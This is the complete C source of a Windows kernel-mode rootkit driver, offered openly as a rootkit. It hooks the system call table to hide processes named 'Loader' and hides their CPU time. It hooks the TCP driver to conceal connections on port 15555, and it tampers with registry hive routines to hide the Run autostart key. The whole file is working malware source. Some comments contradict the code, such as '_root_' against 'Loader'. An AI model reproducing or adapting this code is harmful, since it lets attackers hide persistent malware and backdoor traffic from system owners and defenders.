///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.c
// 
// Author: Jamie Butler
// Email:  james.butler@hbgary.com or butlerjr@acm.org
//
// Description: This is where the work gets done.
//
// Version: 1.0
// 
//#include "windef.h"
//#include "stdio.h"
//#include "stdlib.h"
#include "ntddk.h"
#include "tdiinfo.h"

#include "RootkitPort.h"

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; //Used only in checked build
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]


PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
       _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
       InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define GET_PTR(ptr, offset) ( *(PVOID*)( (ULONG)ptr + (offset##Offset) ) )

struct _SYSTEM_THREADS
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                           WaitTime;
        PVOID                           StartAddress;
        CLIENT_ID                       ClientIs;
        KPRIORITY                       Priority;
        KPRIORITY                       BasePriority;
        ULONG                           ContextSwitchCount;
        ULONG                           ThreadState;
        KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
        ULONG                           NextEntryDelta;
        ULONG                           ThreadCount;
        ULONG                           Reserved[6];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ProcessName;
        KPRIORITY                       BasePriority;
        ULONG                           ProcessId;
        ULONG                           InheritedFromProcessId;
        ULONG                           HandleCount;
        ULONG                           Reserved2[2];
        VM_COUNTERS                     VmCounters;
        IO_COUNTERS                     IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS          Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
		LARGE_INTEGER					IdleTime;
		LARGE_INTEGER					KernelTime;
		LARGE_INTEGER					UserTime;
		LARGE_INTEGER					DpcTime;
		LARGE_INTEGER					InterruptTime;
		ULONG							InterruptCount;
};


NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
                        IN PVOID SystemInformation,
                        IN ULONG SystemInformationLength,
                        OUT PULONG ReturnLength);


typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
            ULONG SystemInformationCLass,
                        PVOID SystemInformation,
                        ULONG SystemInformationLength,
                        PULONG ReturnLength
);

ZWQUERYSYSTEMINFORMATION        OldZwQuerySystemInformation;

// Added by Creative of rootkit.com
LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;

///////////////////////////////////////////////////////////////////////
// NewZwQuerySystemInformation function
//
// ZwQuerySystemInformation() returns a linked list of processes.
// The function below imitates it, except it removes from the list any
// process who's name begins with "_root_".

NTSTATUS NewZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
            IN PVOID SystemInformation,
            IN ULONG SystemInformationLength,
            OUT PULONG ReturnLength)
{

   NTSTATUS ntStatus;

   ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
					SystemInformationClass,
					SystemInformation,
					SystemInformationLength,
					ReturnLength );

   if( NT_SUCCESS(ntStatus)) 
   {
	DbgPrint("System Information Class: %d\n", SystemInformationClass);

      // Asking for a file and directory listing
      if(SystemInformationClass == 5)
      {
	     // This is a query for the process list.
		 // Look for process names that start with
		 // '_root_' and filter them out.

		 
		 struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
         struct _SYSTEM_PROCESSES *prev = NULL;
		 
		 while(curr)
		 {
            //DbgPrint("Current item is %x\n", curr);
			if (curr->ProcessName.Buffer != NULL)
			{
				if(0 == memcmp(curr->ProcessName.Buffer, L"Loader", 12))
				{
					m_UserTime.QuadPart += curr->UserTime.QuadPart;
					m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

					if(prev) // Middle or Last entry
					{
						if(curr->NextEntryDelta)
							prev->NextEntryDelta += curr->NextEntryDelta;
						else	// we are last, so make prev the end
							prev->NextEntryDelta = 0;
					}
					else
					{
						if(curr->NextEntryDelta)
						{
							// we are first in the list, so move it forward
							(char *)SystemInformation += curr->NextEntryDelta;
						}
						else // we are the only process!
							SystemInformation = NULL;
					}
				}
			}
			else // This is the entry for the Idle process
			{
			   // Add the kernel and user times of _root_* 
			   // processes to the Idle process.
			   curr->UserTime.QuadPart += m_UserTime.QuadPart;
			   curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

			   // Reset the timers for next time we filter
			   m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
			}
			prev = curr;
		    if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
		    else curr = NULL;
	     }
	  }
	  else if (SystemInformationClass == 8) // Query for SystemProcessorTimes
	  {
         struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
         times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
	  }

   }
   return ntStatus;
}


const WCHAR deviceNameBuffer[] = L"\\Device\\SystemDevice";
PDEVICE_OBJECT g_rootkitDevice;
/* Entry of this Rootkit */
NTSTATUS DriverEntry(
				   IN PDRIVER_OBJECT  DriverObject,
				   IN PUNICODE_STRING RegistryPath
					)
{
	
    NTSTATUS                ntStatus;
	
	// Rootkit Register a Device
	UNICODE_STRING			deviceNameUnicodeString;
	RtlInitUnicodeString(&deviceNameUnicodeString, deviceNameBuffer);
	ntStatus = IoCreateDevice( DriverObject, 0, &deviceNameUnicodeString, 0x00001234, 0, TRUE, &g_rootkitDevice );
	if(!NT_SUCCESS(ntStatus))
		DbgPrint("Create Device Failed!");
	
	DbgPrint("Here!\n");

	OldIrpMjDeviceControl = NULL;

    DriverObject->DriverUnload = RootkitUnload;  // Setting Unload Handler of this Rootkit
	
	/*******************************************************************/
	/******************  Hide the Port Of Our Loader *******************/
	/*******************************************************************/
	ntStatus = InstallTCPDriverHook();
	if(!NT_SUCCESS(ntStatus)) 
		return ntStatus;
	
	/*******************************************************************/
	/********************  Hide the Registery Item  ********************/
	/*******************************************************************/
	ntStatus = InstallRegisteryHook();
	if (!NT_SUCCESS(ntStatus))
		return ntStatus;
	
	/*******************************************************************/
	/*****************  Hide the File Of Our Rootkit  ******************/
	/*******************************************************************/
	
	
	/*******************************************************************/
	/*****************  Hide the Process Of Our Loader *****************/
	/*******************************************************************/
	// Initialize global times to zero
    // These variables will account for the 
    // missing time our hidden processes are
    // using.
    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

    // Get Old Process Query Function
    OldZwQuerySystemInformation =(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

    // Map the memory into our domain so we can change the permissions(Readonly to R/W) on the MDL
    g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
    if(!g_pmdlSystemCall)
       return STATUS_UNSUCCESSFUL;
   
    MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	
    // Change the flags of the MDL
    g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

    MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);

    // Hook Process Query Functions
    HOOK_SYSCALL( ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation );
	
	return STATUS_SUCCESS;
}

HANDLE OpenKeyByName(PCWSTR pwcsKeyName) 
{
	NTSTATUS status;
	UNICODE_STRING uKeyName;
	OBJECT_ATTRIBUTES oa;
	HANDLE hKey;
	
	RtlInitUnicodeString(&uKeyName, pwcsKeyName);
	// Get By Name
	InitializeObjectAttributes(&oa, &uKeyName, OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE, NULL, NULL);
	status = ZwOpenKey(&hKey, KEY_READ, &oa);
	if (!NT_SUCCESS(status)) {
		DbgPrint("ZwOpenKey Failed: %lx\n", status);
		return NULL;
	}
	return hKey;
}

// Get Key Control Block of Handler
PVOID GetKeyControlBlock(HANDLE hKey)
{
	NTSTATUS status;
	PCM_KEY_BODY KeyBody;
	PVOID KCB;
	
	if (hKey == NULL) return NULL;
	status = ObReferenceObjectByHandle(hKey, KEY_READ, NULL, KernelMode, &KeyBody, NULL);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Get KCB Failed!\n");
		return NULL;
	}
	
	KCB = KeyBody->KeyControlBlock;
	DbgPrint("KeyControlBlock = %lx\n", KCB);
	ObDereferenceObject(KeyBody);
	return KCB;
}

WCHAR _g_HideKeyName[] = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

PGET_CELL_ROUTINE *g_ppGetCellRoutine = NULL;
PGET_CELL_ROUTINE g_pGetCellRoutine = NULL;

PCM_KEY_NODE g_HideNode = NULL;
PCM_KEY_NODE g_LastNode = NULL;

PVOID MyGetCellRoutine(PVOID Hive, HANDLE Cell);

NTSTATUS InstallRegisteryHook() {
	ULONG BuildNumber;
	ULONG KeyHiveOffset;  // KeyControlBlock -> KeyHive
	ULONG KeyCellOffset;  // KeyControlBlock -> KeyCell
	
	HANDLE hKey;
	PVOID KCB, Hive;
	
	KeyHiveOffset = 0x10;
	KeyCellOffset = 0x14;
	
	hKey = OpenKeyByName(_g_HideKeyName);  // Get Device Handle By Name
	KCB = GetKeyControlBlock(hKey);  // Get Key Control Block of Handler
	
	if (KCB)
	{
		// Get Hive of Registery
		PHHIVE Hive = (PHHIVE)GET_PTR(KCB, KeyHive);
		
		g_ppGetCellRoutine = &Hive->GetCellRoutine;
		g_pGetCellRoutine = Hive->GetCellRoutine;
		DbgPrint("GetCellRoutine = %lx\n", g_pGetCellRoutine);
		
		g_HideNode = (PCM_KEY_NODE)g_pGetCellRoutine(Hive, GET_PTR(KCB, KeyCell));
		// Hook
		Hive->GetCellRoutine = MyGetCellRoutine;
	}
	
	ZwClose(hKey);
	return STATUS_SUCCESS;
}

PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node) {
	// Get Parrent Node
	PCM_KEY_NODE ParentNode = (PCM_KEY_NODE)g_pGetCellRoutine(Hive, Node->Parent);
	
	// Get Sub Index
	PCM_KEY_INDEX Index = (PCM_KEY_INDEX)g_pGetCellRoutine(Hive, ParentNode->SubKeyLists[0]);
	DbgPrint("ParentNode = %lx\nIndex = %lx\n", ParentNode, Index);
	
	if (Index->Signature == CM_KEY_INDEX_ROOT) {
		Index = (PCM_KEY_INDEX)g_pGetCellRoutine(Hive, Index->List[Index->Count-1]);
		DbgPrint("Index=%lx\n", Index);
	}
	if (Index->Signature == CM_KEY_FAST_LEAF || Index->Signature == CM_KEY_HASH_LEAF) {
		return g_pGetCellRoutine(Hive, Index->List[2*(Index->Count - 1)]);
	} else {
		return g_pGetCellRoutine(Hive, Index->List[Index->Count - 1]);
	}
}

PVOID MyGetCellRoutine(PVOID Hive, HANDLE Cell) {
	PVOID pRet = g_pGetCellRoutine(Hive, Cell);
	if (!pRet) {
		return NULL;
	}
	if (pRet == g_HideNode) {
	    DbgPrint("GetCellRoutine(%lx, %08lx) = %lx\n", Hive, Cell, pRet);
		pRet = g_LastNode = (PCM_KEY_NODE)GetLastKeyNode(Hive, g_HideNode);
		DbgPrint("g_LastNode = %lx\n", g_LastNode);
		if (pRet == g_HideNode) pRet = NULL;
	} else if (pRet == g_LastNode) {
	    DbgPrint("GetCellRoutine(%lx, %08lx) = %lx\n", Hive, Cell, pRet);
		pRet = g_LastNode = NULL;
	}
	return pRet;
}

NTSTATUS InstallTCPDriverHook()
{
    NTSTATUS       ntStatus;
//  UNICODE_STRING deviceNameUnicodeString;
//  UNICODE_STRING deviceLinkUnicodeString;        
	UNICODE_STRING deviceTCPUnicodeString;
	WCHAR deviceTCPNameBuffer[]  = L"\\Device\\Tcp";
    pFile_tcp  = NULL;
	pDev_tcp   = NULL;
	pDrv_tcpip = NULL;

	RtlInitUnicodeString (&deviceTCPUnicodeString, deviceTCPNameBuffer);
	ntStatus = IoGetDeviceObjectPointer(&deviceTCPUnicodeString, FILE_READ_DATA, &pFile_tcp, &pDev_tcp);
	if(!NT_SUCCESS(ntStatus)) 
		return ntStatus;
	pDrv_tcpip = pDev_tcp->DriverObject;

	OldIrpMjDeviceControl = pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL]; 
	if (OldIrpMjDeviceControl)
		InterlockedExchange ((PLONG)&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)HookedDeviceControl);
	
	return STATUS_SUCCESS;
}


NTSTATUS HookedDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    PIO_STACK_LOCATION      irpStack;
    ULONG                   ioTransferType;
	TDIObjectID             *inputBuffer;
	DWORD					context;

	//DbgPrint("The current IRP is at %x\n", Irp);

    // Get a pointer to the current location in the Irp. This is where
    // the function codes and parameters are located.
    irpStack = IoGetCurrentIrpStackLocation (Irp);

    switch (irpStack->MajorFunction) 
	{
	    case IRP_MJ_DEVICE_CONTROL:
			if ((irpStack->MinorFunction == 0) && \
				(irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_TCP_QUERY_INFORMATION_EX))  // We just care the type of IOCTL_TCP_QUERY_INFORMATION_EX, in which will process the port information.
			{
				ioTransferType = irpStack->Parameters.DeviceIoControl.IoControlCode;
				ioTransferType &= 3;
				if (ioTransferType == METHOD_NEITHER) // Need to know the method to find input buffer
				{
					inputBuffer = (TDIObjectID *) irpStack->Parameters.DeviceIoControl.Type3InputBuffer;
					
					// CO_TL_ENTITY is for TCP and CL_TL_ENTITY is for UDP
					// We just care the UDP
					if (inputBuffer->toi_entity.tei_entity == CO_TL_ENTITY)
					{ 
						// DbgPrint("Input buffer %x\n",inputBuffer);
						if ((inputBuffer->toi_id == 0x101) || (inputBuffer->toi_id == 0x102) || (inputBuffer->toi_id == 0x110))
						{
							// Call our completion routine if IRP successful
							irpStack->Control = 0;
							irpStack->Control |= SL_INVOKE_ON_SUCCESS; 

							// Save old completion routine if present
							irpStack->Context = (PIO_COMPLETION_ROUTINE) ExAllocatePool(NonPagedPool, sizeof(REQINFO));

							((PREQINFO)irpStack->Context)->OldCompletion = irpStack->CompletionRoutine; 
							((PREQINFO)irpStack->Context)->ReqType       = inputBuffer->toi_id;

							// Setup our function to be called on completion of IRP
							irpStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)IoCompletionRoutine;
						}
					}
				}
			}
		break;
		
		default:
		break;
    }

    return OldIrpMjDeviceControl(DeviceObject, Irp);
}


NTSTATUS IoCompletionRoutine(IN PDEVICE_OBJECT DeviceObject, 
							 IN PIRP Irp, 
							 IN PVOID Context)
{
	PVOID OutputBuffer;
    DWORD NumOutputBuffers;
	PIO_COMPLETION_ROUTINE p_compRoutine;
	DWORD i;

	// Connection status values:
	// 0 = Invisible
	// 1 = CLOSED
	// 2 = LISTENING
	// 3 = SYN_SENT
	// 4 = SYN_RECEIVED
	// 5 = ESTABLISHED
	// 6 = FIN_WAIT_1
	// 7 = FIN_WAIT_2
	// 8 = CLOSE_WAIT
	// 9 = CLOSING
	// ...

	OutputBuffer = Irp->UserBuffer;
	p_compRoutine = ((PREQINFO)Context)->OldCompletion;

	if (((PREQINFO)Context)->ReqType == 0x101)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO101);
		for(i = 0; i < NumOutputBuffers; i++)
		{
			// Hide all Web connections
			if (HTONS(((PCONNINFO101)OutputBuffer)[i].dst_port) == 15555)
				((PCONNINFO101)OutputBuffer)[i].status = 0;
		}
	}
	else if (((PREQINFO)Context)->ReqType == 0x102)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO102);
		for(i = 0; i < NumOutputBuffers; i++)
		{
			// Hide all Web connections
			if (HTONS(((PCONNINFO102)OutputBuffer)[i].dst_port) == 15555)
				((PCONNINFO102)OutputBuffer)[i].status = 0;
		}
	}
	else if (((PREQINFO)Context)->ReqType == 0x110)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO110);
		for(i = 0; i < NumOutputBuffers; i++)
		{
			// Hide all Web connections
			if (HTONS(((PCONNINFO110)OutputBuffer)[i].dst_port) == 15555)
				((PCONNINFO110)OutputBuffer)[i].status = 0;
		}
	}

	ExFreePool(Context);

	/*
	for(i = 0; i < NumOutputBuffers; i++)
	{
		DbgPrint("Status: %d",OutputBuffer[i].status);
		DbgPrint(" %d.%d.%d.%d:%d",OutputBuffer[i].src_addr & 0xff,OutputBuffer[i].src_addr >> 8 & 0xff, OutputBuffer[i].src_addr >> 16 & 0xff,OutputBuffer[i].src_addr >> 24,HTONS(OutputBuffer[i].src_port));
		DbgPrint(" %d.%d.%d.%d:%d\n",OutputBuffer[i].dst_addr & 0xff,OutputBuffer[i].dst_addr >> 8 & 0xff, OutputBuffer[i].dst_addr >> 16 & 0xff,OutputBuffer[i].dst_addr >> 24,HTONS(OutputBuffer[i].dst_port));
	}*/

	if ((Irp->StackCount > (ULONG)1) && (p_compRoutine != NULL))
	{
		return (p_compRoutine)(DeviceObject, Irp, NULL);
	}
	else
	{
		return Irp->IoStatus.Status;
	}
}

NTSTATUS RootkitUnload(IN PDRIVER_OBJECT DriverObject)
{
	/* About Port */
	if (OldIrpMjDeviceControl)
		InterlockedExchange ((PLONG)&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)OldIrpMjDeviceControl);	
	if (pFile_tcp != NULL)
		ObDereferenceObject(pFile_tcp);
	pFile_tcp = NULL;
	DbgPrint("ROOTKIT: OnUnload called\n");

    // unhook system calls
    UNHOOK_SYSCALL( ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation );

    // Unlock and Free MDL
    if(g_pmdlSystemCall)
    {
       MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
       IoFreeMdl(g_pmdlSystemCall);
    }
	
	if (g_ppGetCellRoutine)
		*g_ppGetCellRoutine = g_pGetCellRoutine;
    
	return STATUS_SUCCESS;
}